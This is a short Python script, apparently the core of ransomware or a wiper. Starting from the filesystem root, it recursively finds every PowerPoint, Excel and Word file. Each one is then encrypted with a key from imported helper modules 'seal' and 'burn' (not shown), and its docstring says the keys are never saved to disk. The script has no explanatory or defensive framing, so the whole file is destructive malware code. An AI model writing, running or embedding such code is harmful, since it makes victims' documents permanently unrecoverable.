import os
import fnmatch

extensions = ["pptx","xlsx","docx"]
source = "/"
def find_files()->list[str]:
    """
    Iterate through the system files in order to find files that have extensions of
    interest.
    The search for files is recursive, and the starting point is by default the root
    of the system.
    """
    found_files = []
    for route, dirs, files in os.walk(source):
        for file in files:
            for extension in extensions:
                if fnmatch.fnmatch(file, f'*.{extension}'):
                    found_files.append(os.path.join(route, file))
    return found_files

def quick_encrypt():
    """
    Quickly iterates between files that match the given extensions and encrypts them,
    without ever saving the keys into the hard drive.
    The search for files is recursive, and the starting point is by default the root
    of the system.
    """
    import seal
    import burn 
    priv_key,pub_key=seal.volatile_key()
    for rute, dirs, files in os.walk(source):
        for file in files:
            for extension in extensions:
                if fnmatch.fnmatch(file, f'*.{extension}'):
                    burn.fast_encrypt(os.path.join(rute,file),pub_key)
